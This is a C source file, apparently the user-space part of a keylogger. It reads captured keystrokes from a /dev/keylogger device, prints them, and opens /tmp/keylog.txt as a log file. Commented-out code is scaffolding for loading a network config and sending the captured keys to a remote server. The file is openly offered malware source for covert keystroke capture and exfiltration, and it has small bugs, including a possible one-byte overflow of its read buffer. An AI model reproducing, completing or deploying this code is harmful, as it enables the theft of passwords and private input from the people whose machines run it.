#include <stdio.h>
#include <signal.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include "device_client.h"
#include "logger.h"
#include "network_client.h"
#include "keymap.h"

#define MAX_KEYS 10
#define MAX_KEY_LEN 32

static volatile bool running = true;
static char key_buffer[MAX_KEYS][MAX_KEY_LEN];
static int key_count = 0;
static unsigned long last_key_time = 0;
#define KEY_TIMEOUT 1000  // 1 second timeout for key combinations

void handle_sigint(int sig) {
    (void)sig;
    running = false;
    printf("\nExiting program...\n");
}

int main(void) {
    char buf[1024];
    signal(SIGINT, handle_sigint);

    // Initialize network client
    // if (network_client_init("config.env") < 0) {
    //     if (network_client_init("user/config.env") < 0) {
    //         fprintf(stderr, "Failed to initialize network client\n");
    //         return 1;
    //     }
    // }

    // Initialize device client
    if (device_client_init("/dev/keylogger") < 0) {
        fprintf(stderr, "Failed to initialize device client\n");
        // network_client_cleanup();
        return 1;
    }

    if (logger_open("/tmp/keylog.txt") < 0) {
        fprintf(stderr, "Failed to open log file\n");
        device_client_cleanup();
        // network_client_cleanup();
        return 1;
    }

    printf("Keylogger started. Reading from /dev/keylogger\n");

    while (running) {
        int len = device_client_read(buf, sizeof(buf));
        if (len > 0) {
            buf[len] = '\0'; 
            printf("Received: %s\n", buf);

            // send to server
            // if (network_client_send(output, strlen(output)) < 0) {
            //     fprintf(stderr, "Failed to send keys to server\n");
            // }

            fflush(stdout);
        } else if (len == 0) {
            usleep(10000); 
        }
    }
    logger_close();
    device_client_cleanup();
    // network_client_cleanup();
    return 0;
} 